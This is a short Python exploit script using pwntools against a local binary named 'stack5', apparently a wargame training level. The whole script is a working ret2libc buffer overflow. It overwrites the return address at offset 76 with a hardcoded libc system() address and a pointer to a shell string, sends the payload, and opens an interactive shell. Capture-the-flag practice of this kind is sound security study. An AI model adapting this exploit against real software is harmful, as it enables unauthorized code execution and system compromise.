#!/usr/bin/python
from pwn import *

context.binary = "./stack5"
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


p = process('./stack5') 
# p = gdb.debug('./stack5', gdbscript='''
#                                             b *main 
#                                             continue
#                                         ''')
        
#ret offest
retoffset = 76

# lib c system address
system_addr = p32(0xf7dca150)
padaddr = b'\x90' * 4
shelladdr = p32(0xf7f3f0f5)
payload = flat({retoffset: system_addr}, padaddr, shelladdr)

p.sendline(payload) 
p.interactive()